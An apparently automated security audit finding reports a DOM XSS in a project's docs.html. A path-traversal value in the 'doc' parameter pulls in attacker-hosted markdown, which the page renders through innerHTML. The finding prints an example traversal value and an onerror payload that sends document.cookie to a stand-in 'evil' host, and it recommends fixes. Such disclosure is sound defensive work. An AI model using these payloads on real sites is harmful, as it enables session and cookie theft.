# [HIGH] DOM XSS via path-traversal in `doc` parameter → attacker-controlled markdown rendered with innerHTML

**File:** [`docs/docs.html`](https://github.com/Fast-Editor/Lynkr/blob/feat/parallel-tool-execution/blob/feat/docs/docs.html#L96-L127) (lines 96, 97, 106, 124, 127)
**Project:** claude-code
**Severity:** HIGH  •  **Confidence:** high  •  **Slug:** `xss`

## Owners

**Suggested assignee:** `vishalveera.reddy@servicenow.com` _(via last-committer)_

## Finding

The `doc` URL query parameter (line 96-97) is interpolated unsanitized into the GitHub raw fetch URL on line 106: `https://raw.githubusercontent.com/Fast-Editor/Lynkr/main/documentation/${docName}.md`. Because the value is concatenated into a path segment, an attacker can use traversal (`?doc=../../../../EvilUser/EvilRepo/main/payload`) to make the browser normalize the URL and fetch markdown from an arbitrary GitHub repository the attacker controls. The fetched markdown is then run through `marked.parse(markdown)` (line 124), which by default passes raw HTML through (no sanitizer is configured), and the result is assigned to `docContent.innerHTML` on line 127. While inline `<script>` tags inserted via innerHTML do not execute, event-handler vectors absolutely do (e.g., `<img src=x onerror=fetch('https://evil/?c='+document.cookie)>`, `<svg onload=...>`, `<iframe srcdoc=...>`). This gives attacker-controlled JS execution in the docs.html origin via a single shared link.

## Recommendation

Validate `docName` against a strict allow-list (the sidebar already enumerates the known docs) or at minimum reject any value that is not `^[a-z0-9-]+$`. Additionally, sanitize marked output with DOMPurify before assigning to innerHTML, or set `marked.setOptions({ sanitize: true })` (or use the built-in sanitizer plugin) and use `textContent` for any non-HTML content.

## Recent committers (`git log`)

- vishal veerareddy <vishalveera.reddy@servicenow.com> (2026-04-15)
- Vishal Veera Reddy <veerareddyvishal56@gmail.com> (2026-02-22)
